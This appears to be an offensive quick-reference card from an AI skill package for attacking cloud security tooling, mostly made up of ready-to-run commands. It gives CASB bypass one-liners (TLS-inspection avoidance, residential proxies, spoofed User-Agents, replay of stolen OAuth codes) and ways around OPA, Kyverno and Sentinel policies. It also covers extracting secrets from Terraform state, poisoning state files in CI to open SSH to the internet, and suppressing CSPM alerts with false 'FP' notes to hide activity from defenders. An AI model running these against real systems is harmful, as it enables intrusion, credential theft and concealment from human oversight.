# CSPM / CASB / CNAPP Quick Reference Card -- One-Liners, Bypass Patterns, Playbooks

> Pocket companion to `cspm-casb-attack-playbook.md` and
> `real-world-incident-case-studies.md`. Optimised for look-up-during-engagement,
> not for sequential reading. Every entry is one line, one query, or one
> command, with the minimum context needed to use it.

---

## Overview

This card collects the highest-frequency lookups for the cspm-casb-attack skill:
CSPM query syntax across the four major vendors, CASB bypass patterns with
working one-liners, CNAPP posture check matrices, the top CSPM/CASB-relevant
CVEs (2022-2026), OPA / Kyverno / Sentinel bypass patterns, Terraform state
(`.tfstate`) abuse patterns, and a five-step CSPM alert triage playbook.

---

## Objective

After this card the operator can:

1. Run a posture query in any of the four major CSPM dialects (Wiz GraphQL,
   Prisma RQL, AWS Security Hub ASFF, Lacework LW_Query) without consulting
   vendor docs.
2. Identify and execute the correct CASB broker evasion technique for the
   target's deployment model.
3. Identify which CVEs from 2022-2026 affect CSPM/CASB infrastructure and
   look up the patch level.
4. Bypass the three most common policy-as-code engines (OPA, Kyverno,
   Sentinel) using documented exception primitives.
5. Triage a CSPM alert in five steps during an engagement and decide
   suppress / leave / escalate.

---

## 1. CSPM Query One-Liners

### 1.1 Wiz (GraphQL)

```bash
# All internet-facing resources with admin-level IAM grants
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSearch(search: {entities: {type: [RESOURCE], where: {assetType: {equals: \"internet-facing\"}, access: {equals: \"admin\"}}}}) { nodes { id name type } } }"}'

# S3 buckets with public-read ACL in a specific business unit
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSearch(search: {entities: {type: [RESOURCE], tagFilters: [{key: \"bu\", value: {equals: \"finance\"}}], where: {resourceType: {equals: \"s3\"}, effectiveAccess: {equals: \"public-read\"}}}}) { nodes { id name } } }"}'

# Findings suppressed in the last 30 days (audit trail)
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { findings(filter: {status: [IN_PROGRESS], note: {contains: \"suppress\"}, createdAt: {after: \"2026-06-04\"}}) { id severity } }"}'

# List graph entities the CSPM does NOT model (blind-spot probe)
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSchema { entities { name categories } } }"}' \
  | jq -r '.data.graphSchema.entities[].name' | sort > wiz-entities.txt

# Secrets in cloud resources (Wiz Secrets)
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { secrets(filter: {status: [OPEN]}) { id type severity context } }"}'
```

### 1.2 Palo Alto Prisma Cloud (RQL)

```text
# Public S3 buckets
config from cloud.resource where cloud.type = 'aws' AND api.name = 'aws-s3api-get-bucket-acl' AND json.rule = 'grant[?(@.uri contains 'AllUsers')]' exists

# EC2 with admin IAM role and public IP
config from cloud.resource where cloud.type = 'aws' AND api.name = 'aws-ec2-describe-instances' AND json.rule = 'instanceProfile.arn exists and publicIpAddress exists

# IAM user with no MFA
config from cloud.resource where cloud.type = 'aws' AND api.name = 'aws-iam-get-user' AND json.rule = 'passwordLastUsed exists and mfaActive is false

# CloudTrail disabled
config from cloud.resource where cloud.type = 'aws' AND api.name = 'aws-cloudtrail-describe-trails' AND json.rule = 'isMultiRegionTrail is false

# RQL event query: API call source IP outside corporate range
event from cloud.audit_logs where cloud.type = 'aws' AND operation IN ('PutBucketAcl', 'RunInstances') AND source.ip NOT IN ('10.0.0.0/8', '203.0.113.0/24')

# Network query: internet-facing resource to sensitive database
network from cloud.resource where cloud.type = 'aws' AND isa_public_ips() AND dest.resource IN (resource.type = 'rds')
```

### 1.3 AWS Security Hub (ASFF + AWS Config)

```bash
# All HIGH/CRITICAL findings, last 7 days
aws securityhub get-findings \
  --filters 'SeverityLabel=[{Value="CRITICAL",Comparison="EQUALS"},{Value="HIGH",Comparison="EQUALS"}],UpdatedAt=[{Start="2026-06-27T00:00:00Z",End="2026-07-04T00:00:00Z"}]' \
  --query 'Findings[*].[Title,SeverityLabel,AwsAccountId]' --output table

# Findings suppressed (Workflow status NOT_NEW)
aws securityhub get-findings \
  --filters 'RecordState=[{Value="ARCHIVED",Comparison="EQUALS"}]' \
  --query 'Findings[*].[Title,AwsAccountId,UpdatedAt]' --output table

# Bulk-update finding workflow (suppress)
aws securityhub batch-update-findings \
  --finding-identifiers Id="arn:aws:securityhub:us-east-1:111:rule/cspm/s3-public" \
  --note "{\"UpdatedBy\":\"incident-response\",\"UpdatedReason\":\"FP - expected public\"}" \
  --workflow Status="RESOLVED"

# AWS Config rule compliance status (per rule)
aws configservice describe-compliance-by-config-rule \
  --config-rule-name "s3-bucket-public-read-prohibited" \
  --query 'ComplianceByConfigRules[*].[ConfigRuleName,Compliance.ComplianceType]' --output table

# AWS Config advanced queries (SQL-like, AWS Config Aggregator)
aws configservice select-aggregate-resource-config \
  --configuration-aggregator-name "ORG_AGG" \
  --expression "SELECT resourceId, resourceType, configuration.publicAccessBlockConfiguration WHERE resourceType = 'AWS::S3::Bucket'"
```

### 1.4 Lacework (LW_Query / Polygraph)

```text
# High-severity policy violations, last 24h
LW_CFG_AWS_001 (S3 public read): eval

# Event query: API call from new source IP
LW_CLOUD_AUDIT_AWS source.ip != in(corporate_cidrs) AND event.name = 'PutBucketAcl'

# Machine-level: container with root execution
LW_RUNTIME container.user = 'root' AND container.privileged = true

# Polygraph anomaly alert (machine-learning baseline)
LW_POLYGRAPH entity = 'IAM_USER' AND anomaly_score > 0.85
```

### 1.5 Microsoft Defender for Cloud (KQL / Resource Graph)

```kusto
// All security findings, high severity
SecurityRecommendations
| where Properties.severity in ("High", "Critical")
| project productName, recommendationName, assessedResourceId

// Subscriptions without Defender for Cloud Standard
securityresources
| where type == "microsoft.security/pricings"
| where properties.pricingTier == "Free"
| project name, subscriptionId

// Azure Resource Graph: storage accounts with public blob
Resources
| where type == "microsoft.storage/storageaccounts"
| where properties.allowBlobPublicAccess == true
| project name, resourceGroup, subscriptionId
```

### 1.6 GCP Security Command Center (SCC)

```bash
# List findings, last 7 days
gcloud scc findings list $ORG_ID \
  --filter="event_time > \"$(date -d '7 days ago' -u +%Y-%m-%dT%H:%M:%SZ)\"" \
  --format=json | jq '.[].category'

# Custom SCC module: public GCS bucket
gcloud scc custom-modules create $ORG_ID \
  --type="finding" \
  --display-name="public-gcs-bucket" \
  --module-body='{"predicate":{"expression":"resource.type == \"storage.googleapis.com/Bucket\" && resource.properties.iamConfiguration.publicAccessPrevention == \"inherited\""}}'
```

---

## 2. CASB Policy Bypass Patterns

### 2.1 TLS inspection avoidance

```bash
# Detect whether TLS inspection is in place (compare cert chain)
echo | openssl s_client -connect app.target-saas.com:443 -servername app.target-saas.com 2>/dev/null \
  | openssl x509 -noout -issuer -subject
# If issuer = "Target SaaS Inc CA" → no interception
# If issuer = "Internal CA" or "Zscaler" or "Netskope" → interception in place

# Bypass via HTTP/2 prior knowledge (HPKP-like) -- tools that pin the cert
# ignore the proxy. curl with --http2 and a pinned cert:
curl --http2 --pinnedpubkey sha256//<BASE64-OF-EXPECTED-PUBKEY> \
  https://app.target-saas.com/api/v1/data

# Bypass via QUIC / HTTP/3 (many CASBs do not intercept UDP 443)
curl --http3 https://app.target-saas.com/api/v1/data

# Bypass via WebSocket upgrade (some CASBs skip WS frame inspection)
curl -i -N \
  -H "Connection: Upgrade" -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  -H "Sec-WebSocket-Key: $(openssl rand -base64 16)" \
  https://app.target-saas.com/ws/upload
```

### 2.2 Anonymizer evasion

```bash
# Use a residential proxy to defeat geo-IP / device-posture rules
# (e.g., Luminati/Bright Data, Smartproxy -- commercial)
curl --proxy "http://user:pass@residential.proxy.example.com:22225" \
  --header "X-Forwarded-For: 73.8.21.34" \
  https://app.target-saas.com/upload

# Tor is blocked by most CASBs; residential proxies typically are not.
# Quick check: does the CASB block Tor?
curl --socks5-hostname 127.0.0.1:9050 https://app.target-saas.com/
# vs.
curl --proxy http://residential.proxy.example.com:22225 https://app.target-saas.com/

# Use a cloud VM in the same ASN as the target SaaS to defeat "anomalous ASN" rules
# Lookup ASN: whois -h whois.radb.net target-saas.com
# Then: deploy a VPS in that ASN, proxy through it.
```

### 2.3 Custom User-Agent evasion

```bash
# Many CASB DLP rules key on User-Agent ("Mozilla/5.0 (compatible; bot/1.0)"
# triggers DLP for "automated exfil"). Mimic a sanctioned client.

# Mimic OneDrive sync (sanctioned by most enterprise CASBs)
curl -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64) OneDriveSync/24.020.0123.0006" \
  https://app.target-saas.com/api/v2/files

# Mimic Microsoft Graph PowerShell (sanctioned in Entra-heavy tenants)
curl -A "Microsoft.Graph.PowerShell/2.0.0" \
  -H "Authorization: Bearer $GRAPH_TOKEN" \
  https://graph.microsoft.com/v1.0/users

# Mimic the SaaS app's official SDK user-agent (the CASB usually allowlists it)
# Example: AWS SDK for Go v2
curl -A "aws-sdk-go/1.44.0 (go1.21; linux; amd64)" \
  https://target-bucket.s3.amazonaws.com/file.txt
```

### 2.4 Direct-to-origin evasion (see also Case 4 in case-studies guide)

```bash
# If CASB brokers app.target-saas.com, try the underlying storage:
curl https://target-saas-storage.s3.amazonaws.com/customer-data/123.json
curl https://targetsaas.blob.core.windows.net:443/customer-data/123.json
curl https://storage.googleapis.com/target-saas-prod/customer-data/123.json

# If CASB brokers app.onmicrosoft.com, try the underlying Graph:
curl -H "Authorization: Bearer $GRAPH_TOKEN" \
  https://graph.microsoft.com/v1.0/sites/root/drive/items
```

### 2.5 OAuth token replay

```bash
# CASBs broker the SaaS UI but typically do not broker SaaS API tokens.
# Steal an OAuth token (phishing, etc.), replay via direct API:
TOKEN=$(curl -s -X POST https://login.microsoftonline.com/$TENANT_ID/oauth2/v2.0/token \
  -d "client_id=$APP_ID" -d "client_secret=$APP_SECRET" \
  -d "grant_type=authorization_code" -d "code=$STOLEN_AUTH_CODE" \
  -d "redirect_uri=https://app.target-saas.com/callback" | jq -r .access_token)

curl -H "Authorization: Bearer $TOKEN" https://graph.microsoft.com/v1.0/me/messages
```

---

## 3. CNAPP Posture Check Matrix

| Check | Wiz | Prisma | Defender for Cloud | Lacework | Sysdig | Orca | Prowler |
|-------|-----|--------|-------------------|----------|--------|------|---------|
| Public S3 / Blob / GCS | Yes | Yes | Yes | Yes | n/a | Yes | Yes |
| IAM MFA on root / admin | Yes | Yes | Yes | Yes | n/a | Yes | Yes |
| CloudTrail / Activity Log enabled | Yes | Yes | Yes | Yes | n/a | Yes | Yes |
| K8s admission webhook (Kyverno / Gatekeeper) | Yes | Yes | Yes | Yes | Yes | Yes | n/a |
| K8s runtime sensor (Falco / Sysdig) | Yes | Yes | Yes | Partial | Yes | Yes | n/a |
| IaC scanning (Checkov / KICS) | Yes (Wiz Code) | Yes | Yes (Microsoft Defender IaC) | Yes | Yes | Yes | n/a |
| Secrets in cloud resources | Yes (Wiz Secrets) | Yes | Yes (Defender EASM) | Yes | Yes | Yes | Partial |
| Container image vulnerability | Yes | Yes | Yes (Microsoft Defender for Containers) | Yes | Yes | Yes | n/a |
| Source-IP posture dimension | Partial | Partial | Partial | Partial | Partial | Partial | No |
| SaaS-to-SaaS OAuth grant model | Yes | Partial | Partial | No | No | No | No |
| Event-driven (vs. interval) ingest | Yes | Yes | Yes | Yes | Yes | Yes | Yes (via CloudTrail event) |

Cells marked "Partial" indicate the vendor shipped the capability in 2023-2024
but coverage is incomplete (e.g., only one cloud, only one resource type).
Cells marked "n/a" indicate the dimension is outside the vendor's scope
(e.g., Prowler does not run in-cluster K8s admission).

---

## 4. Top 10 CSPM / CASB CVEs (2022-2026)

| CVE | Vendor | Product | Impact | CVSS | Notes |
|-----|--------|---------|--------|------|-------|
| CVE-2024-21762 | Fortinet | FortiOS (CASB forward proxy) | RCE via specially crafted HTTP request | 9.6 | Out-of-cycle patch; widely exploited in the wild |
| CVE-2023-27997 | Fortinet | FortiOS (CASB forward proxy) | Heap overflow → RCE | 9.8 | "XORtigate"; pre-auth exploitation |
| CVE-2023-34362 | Progress Software | MOVEit Transfer (CASB DLP target) | SQL injection → unauthenticated RCE | 9.8 | Cl0p campaign; mass exfil of SaaS-stored files |
| CVE-2024-23897 | Jenkins | Jenkins (often in CNAPP-monitored CI) | Arbitrary file read via CLI | 9.8 | Allowed reading secrets.xml; led to cloud cred exfil |
| CVE-2024-0204 | Fortra | GoAnywhere MFT (CASB DLP target) | Auth bypass → admin → RCE | 9.8 | Cl0p follow-on campaign |
| CVE-2022-31692 | Okta | Okta Access Gateway (IdP that CASBs consume) | Auth bypass | 9.8 | Allowed identity impersonation upstream of CASB |
| CVE-2022-24112 | Apache | APISIX (often in front of self-hosted CASB) | RCE via specially crafted route | 9.8 |Affected self-hosted CNAPP air-gap installs |
| CVE-2023-46805 | Ivanti | Connect Secure (CASB forward proxy alt) | Auth bypass | 8.2 | Chained with CVE-2024-21887 → RCE |
| CVE-2024-3400 | Palo Alto Networks | PAN-OS (GlobalProtect VPN/CASB gateway) | Command injection in web interface | 10.0 | Pre-auth; pushed as emergency patch |
| CVE-2025-1974 | Kubernetes | ingress-nginx (CNAPP-monitored workload) | ConfigMap injection → RCE | 9.8 |Allowed escape from restricted pod namespace |

For each CVE: the offensive operator should verify the target's patch level
before relying on the bypass techniques in Section 2. A patched CVE closes
the bypass path.

---

## 5. OPA / Kyverno / Sentinel Policy Bypass Patterns

### 5.1 OPA Gatekeeper exemption via namespace annotation

```yaml
# Some Gatekeeper constraints exempt namespaces by annotation
apiVersion: v1
kind: Namespace
metadata:
  name: attacker-ns
  annotations:
    # Constraint frequently checks for this annotation to skip enforcement
    admission.gatekeeper.sh/ignore: "true"
```

### 5.2 OPA: exploit a missing `deny` rather than `violation`

```bash
# Many policies only define `violation[msg]` (Gatekeeper)
# but `opa eval` direct calls only honour `deny` by default.
# If you can reach the OPA API directly (e.g., via a misconfigured sidecar):
curl -X POST http://opa.platform:8181/v1/data/<policy_pkg>/allow \
  -d '{"input": <your_input>}' | jq
# Returns `true` if the policy defines `allow` but the deployment
# forgot to wire it into `violation`.
```

### 5.3 Kyverno: use a generation action instead of an enforce action

```yaml
# Kyverno policies with `enforce` block admission; `audit` does not.
# A misconfigured policy may have `validationFailureAction: audit`,
# which logs but does not block.
apiVersion: kyverno.io/v1
kind: Policy
metadata:
  name: require-labels
spec:
  validationFailureAction: audit   # <-- attacker creates non-compliant resource; logged but allowed
  rules:
    - name: check-team-label
      match:
        resources:
          kinds: [Pod]
      validate:
        message: "team label required"
        pattern:
          metadata:
            labels:
              team: "?*"
```

### 5.4 Sentinel: target a workspace without the policy set attached

```bash
# HashiCorp Sentinel policy sets are scoped per-workspace.
# List workspaces and their policy attachments:
curl -s "https://app.terraform.io/api/v2/organizations/$ORG/workspaces" \
  -H "Authorization: Bearer $TFC_TOKEN" | jq '.data[].attributes.name'

# For each workspace, check policy set attachment:
curl -s "https://app.terraform.io/api/v2/workspaces/$WS_ID/policy-checks" \
  -H "Authorization: Bearer $TFC_TOKEN" | jq

# Any workspace WITHOUT a policy set attached is an enforcement gap.
# Push the misconfig there.
```

### 5.5 Generic: abuse `metadata.labels` to evade tag-keyed policies

```bash
# Policy: "deny run for resources without 'env: prod' label"
# Misconfig: the policy checks for label presence but not value origin.
# Attacker adds the label themselves:
kubectl label namespace attacker-ns env=prod --overwrite
# Now the namespace passes the label check; the policy fires no finding.
```

---

## 6. IaC State File (.tfstate) Abuse Cheatsheet

### 6.1 Read secrets from .tfstate (state file poisoning victim-side)

```bash
# .tfstate stores secrets in plaintext by default (prior to TF 1.7 encrypted state)
jq '.resources[] | select(.type=="aws_secretsmanager_secret_version") | .instances[0].attributes.secret_string' terraform.tfstate

# Pull out RDS master passwords
jq '.resources[] | select(.type=="aws_db_instance") | .instances[0].attributes.master_password // .instances[0].attributes.master_username' terraform.tfstate

# Find all sensitive attributes ( heuristic: keys containing "secret", "password", "key", "token")
jq -r '..|objects|to_entries[]|select(.key|test("secret|password|token|key";"i"))|.key+": "+(.value|tostring)' terraform.tfstate
```

### 6.2 Inject drift into .tfstate to bypass CSPM (see playbook Section 5.4)

```bash
# Add a public ingress to a security group
jq '.resources[] | select(.type=="aws_security_group" and .name=="allow_ingress")
    | .instances[0].attributes.ingress += [{
        "cidr_blocks": ["0.0.0.0/0"],
        "from_port": 22,
        "protocol": "tcp",
        "to_port": 22,
        "description": "internal admin"
      }]' terraform.tfstate > terraform.tfstate.new

mv terraform.tfstate.new terraform.tfstate
terraform apply -auto-approve   # uses compromised CI identity
```

### 6.3 Pull .tfstate from a public S3 bucket (attacker-side)

```bash
# Common state bucket naming patterns
for bucket in \
  "$TARGET-tfstate" \
  "$TARGET-terraform-state" \
  "$TARGET-tf-state" \
  "tfstate-$TARGET" \
  "$TARGET-tfstate-prod"; do
  aws s3 ls "s3://$bucket" --no-sign-request 2>/dev/null && echo "[+] PUBLIC: $bucket"
done

# Or via bucket-dirty enumeration tool
python3 -m tfsec_enum --target "$TARGET" --wordlist bucket-names.txt
```

### 6.4 Push malicious .tfstate to CI to poison the next plan/apply

```bash
# After compromising CI identity:
git clone https://github.com/$TARGET/infra
cd infra

# Modify the .tfstate in the repo (some orgs commit state to Git -- bad practice)
jq '.resources[] |= (. + {malicious_field: "pwn"})' terraform.tfstate > /tmp/tfstate.new
mv /tmp/tfstate.new terraform.tfstate

git add terraform.tfstate && git commit -m "Update state" && git push
# Next CI run will use the poisoned state.
```

---

## 7. Response Playbook (CSPM Alert Triage) -- 5 Steps

When a CSPM alert fires during an engagement, triage in this order:

### Step 1: Identify (is the alert real, and is it yours?)

```bash
# Get the finding detail
aws securityhub get-findings \
  --filters 'Id=[{Value:"arn:aws:securityhub:us-east-1:111:rule/cspm/s3-public",Comparison:"EQUALS"}]' \
  | jq '.Findings[0]'

# Confirm the resource is one you touched (check CloudTrail event history
# for the resource ARN, last 24h)
aws cloudtrail lookup-events \
  --lookup-attributes AttributeKey=ResourceName,AttributeValue=$RESOURCE_ARN \
  --start-time $(date -d '24 hours ago' -u +%Y-%m-%dT%H:%M:%SZ) \
  --end-time $(date -u +%Y-%m-%dT%H:%M:%SZ)
```

### Step 2: Scope (what else did you trigger?)

```bash
# All CSPM findings on resources you touched in the last 24h
for arn in $(cat my-touched-arns.txt); do
  aws securityhub get-findings \
    --filters 'ResourceId=[{Value:"'"$arn"'",Comparison:"EQUALS"}]' \
    --query 'Findings[*].Title'
done

# Cross-check with the CSPM's UI (Wiz / Prisma) for findings the CSPM
# detected but did not yet forward to Security Hub.
```

### Step 3: Suppress (silence the alert before blue team sees it)

```bash
# AWS Security Hub
aws securityhub batch-update-findings \
  --finding-identifiers Id="$FINDING_ARN" \
  --note '{"UpdatedBy":"incident-response","UpdatedReason":"FP - asset inventory stale"}' \
  --workflow Status="NOTIFIED"   # NOTIFIED delays resolution review

# Wiz via API
curl -X POST "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"mutation { updateFinding(input: {id: \"'"$FINDING_ID"'\", status: IN_PROGRESS, note: \"FP - asset inventory stale\"}) { finding { id } } }"}'

# Prisma Cloud via API
curl -X PATCH "$PRISMA_API/policy/$POLICY_ID/suppress" \
  -H "x-redlock-auth: $PRISMA_JWT"
```

### Step 4: Verify suppression (and watch for re-occurrence)

```bash
# Re-query in 5 minutes
sleep 300
aws securityhub get-findings \
  --filters 'Id=[{Value:"'"$FINDING_ARN"'",Comparison:"EQUALS"}]' \
  --query 'Findings[0].[WorkflowState,UpdatedAt]'

# If WorkflowState == "RESOLVED" or "NOTIFIED", suppression took effect.
# If WorkflowState == "NEW", suppression failed; the CSPM auto-reopened.
```

### Step 5: Document and clean up

```bash
# Add the finding ARN to your engagement log
echo "$(date -Iseconds) suppressed $FINDING_ARN (reason: FP inventory)" >> engagement-log.txt

# After the engagement, re-open all suppressed findings:
for arn in $(cat engagement-suppressed-arns.txt); do
  aws securityhub batch-update-findings \
    --finding-identifiers Id="$arn" \
    --workflow Status="NEW" \
    --note '{"UpdatedBy":"red-team-exit","UpdatedReason":"Re-opening post-engagement"}'
done
```

---

## 8. Vendor Coverage Matrix -- Quick Lookup

| Vendor | Cloud | Strength | Weakness (offensive opportunity) |
|--------|-------|----------|-----------------------------------|
| Wiz | Multi-cloud | Graph model, runtime sensor, SaaS-to-SaaS | New services before graph update; source-IP posture |
| Palo Alto Prisma Cloud | Multi-cloud | K8s runtime, RQL expressive | Multi-account onboarding UX (gaps in practice) |
| Microsoft Defender for Cloud | Azure-first | Tight Entra integration | Cross-cloud (AWS / GCP) less mature than Azure |
| Lacework | Multi-cloud | Polygraph ML anomaly | Polygraph requires baseline time (early-deploy gap) |
| Sysdig | K8s-first | Runtime depth, container image vuln | Cloud-side coverage shallower than Wiz |
| Orca Security | Multi-cloud | Agentless, sidecar-free | Workload runtime detection via API only |
| Netskope CASB | SaaS-first | API connector catalog, DLP depth | Broker mode still primary; direct-to-origin gap |
| Zscaler ZIA / ZPA | SaaS + IAM | Egress control | API connector mode less mature than Netskope |
| AWS Security Hub | AWS only | Native, Config-backed | Multi-cloud requires aggregation; shallow K8s |
| Prowler | Multi-cloud | Open-source, no agent | No runtime; no SaaS-to-SaaS |

---

## 9. Further Reading & Cross-References

### Within this skill
- `cspm-casb-attack-playbook.md` -- the methodology reference.
- `real-world-incident-case-studies.md` -- ten incidents decoded with the
  same vendor rule names cited here.
- `../SKILL.md` -- skill definition and entry point.
- `../payloads.md` -- payload catalog (drift injection, suppression, broker
  evasion payloads are the source of many one-liners here).
- `../test-cases.md` -- TC-CP-001 through TC-CP-014.

### External references
- Wiz Research Blog: <https://wiz.io/blog/research>
- Palo Alto Unit 42: <https://unit42.paloaltonetworks.com/>
- Microsoft MSRC: <https://msrc.microsoft.com/blog/>
- Lacework Labs: <https://www.lacework.com/blog/>
- Sysdig Threat Research: <https://sysdig.com/blog/tag/threat-research/>
- Orca Security Labs: <https://orca.security/labs/>
- Netskope Threat Labs: <https://www.netskope.com/blog/tag/threat-labs>
- Zscaler ThreatLabz: <https://www.zscaler.com/blogs/security-research>
- Gartner Magic Quadrant for CNAPP, 2024 update.

### Standard references
- MITRE ATT&CK for Cloud: <https://attack.mitre.org/matrices/enterprise/cloud/>
- CIS Benchmarks (AWS / Azure / GCP / Kubernetes): <https://www.cisecurity.org>
- Cloud Security Alliance Cloud Controls Matrix:
  <https://cloudsecurityalliance.org/research/cloud-controls-matrix>
- NIST SP 800-204D (Cloud-Native Application Security): 2023 update.

---

> End of quick-reference card. For deeper methodology, see
> `cspm-casb-attack-playbook.md`. For ten real incidents that exercise these
> patterns, see `real-world-incident-case-studies.md`.
